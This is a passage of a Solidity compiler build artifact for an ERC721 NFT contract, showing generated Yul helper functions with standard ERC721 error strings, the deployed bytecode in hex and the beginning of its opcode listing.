abi_encode_t_stringliteral_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_8a66f4bb6512ffbfcc3db9b42318eb65f26ac15163eaa9a1e5cfa7bee9d1c7c6__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_8a66f4bb6512ffbfcc3db9b42318eb65f26ac15163eaa9a1e5cfa7bee9d1c7c6_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_b287e910c6a9cef9f186108b89a3a957a66db6db4d5eed8b59288161d029857b__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_b287e910c6a9cef9f186108b89a3a957a66db6db4d5eed8b59288161d029857b_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function allocate_memory(size) -> memPtr {\n        memPtr := allocate_unbounded()\n        finalize_allocation(memPtr, size)\n    }\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function array_allocation_size_t_bytes_memory_ptr(length) -> size {\n        // Make sure we can allocate memory without overflow\n        if gt(length, 0xffffffffffffffff) { panic_error_0x41() }\n\n        size := round_up_to_mul_of_32(length)\n\n        // add length slot\n        size := add(size, 0x20)\n\n    }\n\n    function array_length_t_bytes_memory_ptr(value) -> length {\n\n        length := mload(value)\n\n    }\n\n    function array_length_t_string_memory_ptr(value) -> length {\n\n        length := mload(value)\n\n    }\n\n    function array_storeLengthForEncoding_t_bytes_memory_ptr_fromStack(pos, length) -> updated_pos {\n        mstore(pos, length)\n        updated_pos := add(pos, 0x20)\n    }\n\n    function array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length) -> updated_pos {\n        mstore(pos, length)\n        updated_pos := add(pos, 0x20)\n    }\n\n    function checked_add_t_uint256(x, y) -> sum {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n\n        // overflow, if x > (maxValue - y)\n        if gt(x, sub(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff, y)) { panic_error_0x11() }\n\n        sum := add(x, y)\n    }\n\n    function checked_sub_t_uint256(x, y) -> diff {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n\n        if lt(x, y) { panic_error_0x11() }\n\n        diff := sub(x, y)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function cleanup_t_bytes4(value) -> cleaned {\n        cleaned := and(value, 0xffffffff00000000000000000000000000000000000000000000000000000000)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function copy_calldata_to_memory(src, dst, length) {\n        calldatacopy(dst, src, length)\n        // clear end\n        mstore(add(dst, length), 0)\n    }\n\n    function copy_memory_to_memory(src, dst, length) {\n        let i := 0\n        for { } lt(i, length) { i := add(i, 32) }\n        {\n            mstore(add(dst, i), mload(add(src, i)))\n        }\n        if gt(i, length)\n        {\n            // clear end\n            mstore(add(dst, length), 0)\n        }\n    }\n\n    function extract_byte_array_length(data) -> length {\n        length := div(data, 2)\n        let outOfPlaceEncoding := and(data, 1)\n        if iszero(outOfPlaceEncoding) {\n            length := and(length, 0x7f)\n        }\n\n        if eq(outOfPlaceEncoding, lt(length, 32)) {\n            panic_error_0x22()\n        }\n    }\n\n    function finalize_allocation(memPtr, size) {\n        let newFreePtr := add(memPtr, round_up_to_mul_of_32(size))\n        // protect against overflow\n        if or(gt(newFreePtr, 0xffffffffffffffff), lt(newFreePtr, memPtr)) { panic_error_0x41() }\n        mstore(64, newFreePtr)\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function panic_error_0x22() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x22)\n        revert(0, 0x24)\n    }\n\n    function panic_error_0x41() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x41)\n        revert(0, 0x24)\n    }\n\n    function revert_error_1b9f4a0a5773e33b91aa01db23bf8c55fce1411167c872835e7fa00a4f17d46d() {\n        revert(0, 0)\n    }\n\n    function revert_error_987264b3b1d58a9c7f8255e93e81c77d86d6299019c33110a076957a3e06e2ae() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function round_up_to_mul_of_32(value) -> result {\n        result := and(add(value, 31), not(31))\n    }\n\n    function store_literal_in_memory_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: caller is not token owne\")\n\n        mstore(add(memPtr, 32), \"r or approved\")\n\n    }\n\n    function store_literal_in_memory_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: transfer to non ERC721Re\")\n\n        mstore(add(memPtr, 32), \"ceiver implementer\")\n\n    }\n\n    function store_literal_in_memory_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: transfer from incorrect \")\n\n        mstore(add(memPtr, 32), \"owner\")\n\n    }\n\n    function store_literal_in_memory_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: token already minted\")\n\n    }\n\n    function store_literal_in_memory_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: transfer to the zero add\")\n\n        mstore(add(memPtr, 32), \"ress\")\n\n    }\n\n    function store_literal_in_memory_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: approve to caller\")\n\n    }\n\n    function store_literal_in_memory_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: address zero is not a va\")\n\n        mstore(add(memPtr, 32), \"lid owner\")\n\n    }\n\n    function store_literal_in_memory_8a66f4bb6512ffbfcc3db9b42318eb65f26ac15163eaa9a1e5cfa7bee9d1c7c6(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: mint to the zero address\")\n\n    }\n\n    function store_literal_in_memory_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: invalid token ID\")\n\n    }\n\n    function store_literal_in_memory_b287e910c6a9cef9f186108b89a3a957a66db6db4d5eed8b59288161d029857b(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721Metadata : URI query for n\")\n\n        mstore(add(memPtr, 32), \"onexistent token\")\n\n    }\n\n    function store_literal_in_memory_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: approval to current owne\")\n\n        mstore(add(memPtr, 32), \"r\")\n\n    }\n\n    function store_literal_in_memory_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: approve caller is not to\")\n\n        mstore(add(memPtr, 32), \"ken owner or approved for all\")\n\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function validator_revert_t_bool(value) {\n        if iszero(eq(value, cleanup_t_bool(value))) { revert(0, 0) }\n    }\n\n    function validator_revert_t_bytes4(value) {\n        if iszero(eq(value, cleanup_t_bytes4(value))) { revert(0, 0) }\n    }\n\n    function validator_revert_t_uint256(value) {\n        if iszero(eq(value, cleanup_t_uint256(value))) { revert(0, 0) }\n    }\n\n}\n","id":15,"language":"Yul","name":"#utility.yul"}],"immutableReferences":{},"linkReferences":{},"object":"608060405234801561001057600080fd5b50600436106101005760003560e01c806370a0823111610097578063b88d4fde11610066578063b88d4fde146102ad578063c2229fea146102c9578063c87b56dd146102d3578063e985e9c51461030357610100565b806370a082311461022557806378ce90351461025557806395d89b4114610273578063a22cb4651461029157610100565b806323b872dd116100d357806323b872dd1461019f57806342842e0e146101bb5780636352211e146101d75780636e02007d1461020757610100565b806301ffc9a71461010557806306fdde0314610135578063081812fc14610153578063095ea7b314610183575b600080fd5b61011f600480360381019061011a919061198e565b610333565b60405161012c9190611cbf565b60405180910390f35b61013d610415565b60405161014a9190611cda565b60405180910390f35b61016d600480360381019061016891906119e8565b6104a7565b60405161017a9190611c58565b60405180910390f35b61019d6004803603810190610198919061194e565b6104ed565b005b6101b960048036038101906101b49190611838565b610605565b005b6101d560048036038101906101d09190611838565b610665565b005b6101f160048036038101906101ec91906119e8565b610685565b6040516101fe9190611c58565b60405180910390f35b61020f61070c565b60405161021c9190611e7c565b60405180910390f35b61023f600480360381019061023a91906117cb565b610716565b60405161024c9190611e7c565b60405180910390f35b61025d6107ce565b60405161026a9190611cda565b60405180910390f35b61027b6107ea565b6040516102889190611cda565b60405180910390f35b6102ab60048036038101906102a6919061190e565b61087c565b005b6102c760048036038101906102c2919061188b565b610892565b005b6102d16108f4565b005b6102ed60048036038101906102e891906119e8565b610946565b6040516102fa9190611cda565b60405180910390f35b61031d600480360381019061031891906117f8565b610995565b60405161032a9190611cbf565b60405180910390f35b60007f80ac58cd000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff191614806103fe57507f5b5e139f000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916145b8061040e575061040d82610a29565b5b9050919050565b60606000805461042490612065565b80601f016020809104026020016040519081016040528092919081815260200182805461045090612065565b801561049d5780601f106104725761010080835404028352916020019161049d565b820191906000526020600020905b81548152906001019060200180831161048057829003601f168201915b5050505050905090565b60006104b282610a93565b6004600083815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050919050565b60006104f882610685565b90508073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610569576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161056090611e3c565b60405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff16610588610ade565b73ffffffffffffffffffffffffffffffffffffffff1614806105b757506105b6816105b1610ade565b610995565b5b6105f6576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016105ed90611e5c565b60405180910390fd5b6106008383610ae6565b505050565b610616610610610ade565b82610b9f565b610655576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161064c90611cfc565b60405180910390fd5b610660838383610c34565b505050565b61068083838360405180602001604052806000815250610892565b505050565b60008061069183610f2e565b9050600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff161415610703576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016106fa90611dfc565b60405180910390fd5b80915050919050565b6000600654905090565b60008073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610787576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161077e90611dbc565b60405180910390fd5b600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b6040518060600160405280603581526020016124f36035913981565b6060600180546107f990612065565b80601f016020809104026020016040519081016040528092919081815260200182805461082590612065565b80156108725780601f1061084757610100808354040283529160200191610872565b820191906000526020600020905b81548152906001019060200180831161085557829003601f168201915b5050505050905090565b61088e610887610ade565b8383610f6b565b5050565b6108a361089d610ade565b83610b9f565b6108e2576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016108d990611cfc565b60405180910390fd5b6108ee848484846110d8565b50505050565b61090033600654611134565b6006547fef1da42f89c42f48befa143007e6f5efd84a2d1cc3dc97c5edd2d3373220f66d60405160405180910390a2600160065461093e9190611f25565b600681905550565b606061095182611152565b610990576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161098790611e1c565b60405180910390fd5b919050565b6000600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16905092915050565b60007f01ffc9a7000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916149050919050565b610a9c81611152565b610adb576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610ad290611dfc565b60405180910390fd5b50565b600033905090565b816004600083815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550808273ffffffffffffffffffffffffffffffffffffffff16610b5983610685565b73ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b92560405160405180910390a45050565b600080610bab83610685565b90508073ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff161480610bed5750610bec8185610995565b5b80610c2b57508373ffffffffffffffffffffffffffffffffffffffff16610c13846104a7565b73ffffffffffffffffffffffffffffffffffffffff16145b91505092915050565b8273ffffffffffffffffffffffffffffffffffffffff16610c5482610685565b73ffffffffffffffffffffffffffffffffffffffff1614610caa576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610ca190611d3c565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610d1a576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610d1190611d7c565b60405180910390fd5b610d278383836001611193565b8273ffffffffffffffffffffffffffffffffffffffff16610d4782610685565b73ffffffffffffffffffffffffffffffffffffffff1614610d9d576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610d9490611d3c565b60405180910390fd5b6004600082815260200190815260200160002060006101000a81549073ffffffffffffffffffffffffffffffffffffffff02191690556001600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055506001600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550816002600083815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550808273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef60405160405180910390a4610f2983838360016112b9565b505050565b60006002600083815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050919050565b8173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610fda576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610fd190611d9c565b60405180910390fd5b80600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f17307eab39ab6107e8899845ad3d59bd9653f200f220920489ca2b5937696c31836040516110cb9190611cbf565b60405180910390a3505050565b6110e3848484610c34565b6110ef848484846112bf565b61112e576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161112590611d1c565b60405180910390fd5b50505050565b61114e828260405180602001604052806000815250611456565b5050565b60008073ffffffffffffffffffffffffffffffffffffffff1661117483610f2e565b73ffffffffffffffffffffffffffffffffffffffff1614159050919050565b60018111156112b357600073ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff16146112275780600360008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825461121f9190611f7b565b925050819055505b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16146112b25780600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546112aa9190611f25565b925050819055505b5b50505050565b50505050565b60006112e08473ffffffffffffffffffffffffffffffffffffffff166114b1565b15611449578373ffffffffffffffffffffffffffffffffffffffff1663150b7a02611309610ade565b8786866040518563ffffffff1660e01b815260040161132b9493929190611c73565b602060405180830381600087803b15801561134557600080fd5b505af192505050801561137657506040513d601f19601f8201168201806040525081019061137391906119bb565b60015b6113f9573d80600081146113a6576040519150601f19603f3d011682016040523d82523d6000602084013e6113ab565b606091505b506000815114156113f1576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016113e890611d1c565b60405180910390fd5b805181602001fd5b63150b7a0260e01b7bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916817bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19161491505061144e565b600190505b949350505050565b61146083836114d4565b61146d60008484846112bf565b6114ac576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016114a390611d1c565b60405180910390fd5b505050565b6000808273ffffffffffffffffffffffffffffffffffffffff163b119050919050565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415611544576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161153b90611ddc565b60405180910390fd5b61154d81611152565b1561158d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161158490611d5c565b60405180910390fd5b61159b600083836001611193565b6115a481611152565b156115e4576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016115db90611d5c565b60405180910390fd5b6001600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550816002600083815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550808273ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef60405160405180910390a46116ee6000838360016112b9565b5050565b600061170561170084611ebc565b611e97565b9050828152602081018484840111156117215761172061215a565b5b61172c848285612023565b509392505050565b60008135905061174381612496565b92915050565b600081359050611758816124ad565b92915050565b60008135905061176d816124c4565b92915050565b600081519050611782816124c4565b92915050565b600082601f83011261179d5761179c612155565b5b81356117ad8482602086016116f2565b91505092915050565b6000813590506117c5816124db565b92915050565b6000602082840312156117e1576117e0612164565b5b60006117ef84828501611734565b91505092915050565b6000806040838503121561180f5761180e612164565b5b600061181d85828601611734565b925050602061182e85828601611734565b9150509250929050565b60008060006060848603121561185157611850612164565b5b600061185f86828701611734565b935050602061187086828701611734565b9250506040611881868287016117b6565b9150509250925092565b600080600080608085870312156118a5576118a4612164565b5b60006118b387828801611734565b94505060206118c487828801611734565b93505060406118d5878288016117b6565b925050606085013567ffffffffffffffff8111156118f6576118f561215f565b5b61190287828801611788565b91505092959194509250565b6000806040838503121561192557611924612164565b5b600061193385828601611734565b925050602061194485828601611749565b9150509250929050565b6000806040838503121561196557611964612164565b5b600061197385828601611734565b9250506020611984858286016117b6565b9150509250929050565b6000602082840312156119a4576119a3612164565b5b60006119b28482850161175e565b91505092915050565b6000602082840312156119d1576119d0612164565b5b60006119df84828501611773565b91505092915050565b6000602082840312156119fe576119fd612164565b5b6000611a0c848285016117b6565b91505092915050565b611a1e81611faf565b82525050565b611a2d81611fc1565b82525050565b6000611a3e82611eed565b611a488185611f03565b9350611a58818560208601612032565b611a6181612169565b840191505092915050565b6000611a7782611ef8565b611a818185611f14565b9350611a91818560208601612032565b611a9a81612169565b840191505092915050565b6000611ab2602d83611f14565b9150611abd8261217a565b604082019050919050565b6000611ad5603283611f14565b9150611ae0826121c9565b604082019050919050565b6000611af8602583611f14565b9150611b0382612218565b604082019050919050565b6000611b1b601c83611f14565b9150611b2682612267565b602082019050919050565b6000611b3e602483611f14565b9150611b4982612290565b604082019050919050565b6000611b61601983611f14565b9150611b6c826122df565b602082019050919050565b6000611b84602983611f14565b9150611b8f82612308565b604082019050919050565b6000611ba7602083611f14565b9150611bb282612357565b602082019050919050565b6000611bca601883611f14565b9150611bd582612380565b602082019050919050565b6000611bed603083611f14565b9150611bf8826123a9565b604082019050919050565b6000611c10602183611f14565b9150611c1b826123f8565b604082019050919050565b6000611c33603d83611f14565b9150611c3e82612447565b604082019050919050565b611c5281612019565b82525050565b6000602082019050611c6d6000830184611a15565b92915050565b6000608082019050611c886000830187611a15565b611c956020830186611a15565b611ca26040830185611c49565b8181036060830152611cb48184611a33565b905095945050505050565b6000602082019050611cd46000830184611a24565b92915050565b60006020820190508181036000830152611cf48184611a6c565b905092915050565b60006020820190508181036000830152611d1581611aa5565b9050919050565b60006020820190508181036000830152611d3581611ac8565b9050919050565b60006020820190508181036000830152611d5581611aeb565b9050919050565b60006020820190508181036000830152611d7581611b0e565b9050919050565b60006020820190508181036000830152611d9581611b31565b9050919050565b60006020820190508181036000830152611db581611b54565b9050919050565b60006020820190508181036000830152611dd581611b77565b9050919050565b60006020820190508181036000830152611df581611b9a565b9050919050565b60006020820190508181036000830152611e1581611bbd565b9050919050565b60006020820190508181036000830152611e3581611be0565b9050919050565b60006020820190508181036000830152611e5581611c03565b9050919050565b60006020820190508181036000830152611e7581611c26565b9050919050565b6000602082019050611e916000830184611c49565b92915050565b6000611ea1611eb2565b9050611ead8282612097565b919050565b6000604051905090565b600067ffffffffffffffff821115611ed757611ed6612126565b5b611ee082612169565b9050602081019050919050565b600081519050919050565b600081519050919050565b600082825260208201905092915050565b600082825260208201905092915050565b6000611f3082612019565b9150611f3b83612019565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff03821115611f7057611f6f6120c8565b5b828201905092915050565b6000611f8682612019565b9150611f9183612019565b925082821015611fa457611fa36120c8565b5b828203905092915050565b6000611fba82611ff9565b9050919050565b60008115159050919050565b60007fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b82818337600083830152505050565b60005b83811015612050578082015181840152602081019050612035565b8381111561205f576000848401525b50505050565b6000600282049050600182168061207d57607f821691505b60208210811415612091576120906120f7565b5b50919050565b6120a082612169565b810181811067ffffffffffffffff821117156120bf576120be612126565b5b80604052505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b600080fd5b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4552433732313a2063616c6c6572206973206e6f7420746f6b656e206f776e6560008201527f72206f7220617070726f76656400000000000000000000000000000000000000602082015250565b7f4552433732313a207472616e7366657220746f206e6f6e20455243373231526560008201527f63656976657220696d706c656d656e7465720000000000000000000000000000602082015250565b7f4552433732313a207472616e736665722066726f6d20696e636f72726563742060008201527f6f776e6572000000000000000000000000000000000000000000000000000000602082015250565b7f4552433732313a20746f6b656e20616c7265616479206d696e74656400000000600082015250565b7f4552433732313a207472616e7366657220746f20746865207a65726f2061646460008201527f7265737300000000000000000000000000000000000000000000000000000000602082015250565b7f4552433732313a20617070726f766520746f2063616c6c657200000000000000600082015250565b7f4552433732313a2061646472657373207a65726f206973206e6f74206120766160008201527f6c6964206f776e65720000000000000000000000000000000000000000000000602082015250565b7f4552433732313a206d696e7420746f20746865207a65726f2061646472657373600082015250565b7f4552433732313a20696e76616c696420746f6b656e2049440000000000000000600082015250565b7f4552433732314d65746164617461203a2055524920717565727920666f72206e60008201527f6f6e6578697374656e7420746f6b656e00000000000000000000000000000000602082015250565b7f4552433732313a20617070726f76616c20746f2063757272656e74206f776e6560008201527f7200000000000000000000000000000000000000000000000000000000000000602082015250565b7f4552433732313a20617070726f76652063616c6c6572206973206e6f7420746f60008201527f6b656e206f776e6572206f7220617070726f76656420666f7220616c6c000000602082015250565b61249f81611faf565b81146124aa57600080fd5b50565b6124b681611fc1565b81146124c157600080fd5b50565b6124cd81611fcd565b81146124d857600080fd5b50565b6124e481612019565b81146124ef57600080fd5b5056fe697066733a2f2f516d6472796f4578706745515151674a506f727577474a795a6d7a3653715634465254583169373343543369586ea26469706673582212209aa804f7e23260d390ec7ce540589db091d18016e1f41b07a8e632ff977524f764736f6c63430008070033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x100 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x70A08231 GT PUSH2 0x97 JUMPI DUP1 PUSH4 0xB88D4FDE GT PUSH2 0x66 JUMPI DUP1 PUSH4 0xB88D4FDE EQ PUSH2 0x2AD JUMPI DUP1 PUSH4 0xC2229FEA EQ PUSH2 0x2C9 JUMPI DUP1 PUSH4 0xC87B56DD EQ PUSH2 0x2D3 JUMPI DUP1 PUSH4 0xE985E9C5 EQ PUSH2 0x303 JUMPI PUSH2 0x100 JUMP JUMPDEST DUP1 PUSH4 0x70A08231 EQ PUSH2 0x225 JUMPI DUP1 PUSH4 0x78CE9035 EQ PUSH2 0x255 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x273 JUMPI DUP1 PUSH4 0xA22CB465 EQ PUSH2 0x291 JUMPI PUSH2 0x100 JUMP JUMPDEST DUP1 PUSH4 0x23B872DD GT PUSH2 0xD3 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x19F JUMPI DUP1 PUSH4 0x42842E0E EQ PUSH2 0x1BB JUMPI DUP1 PUSH4 0x6352211E EQ PUSH2 0x1D7 JUMPI DUP1 PUSH4 0x6E02007D EQ PUSH2 0x207 JUMPI PUSH2 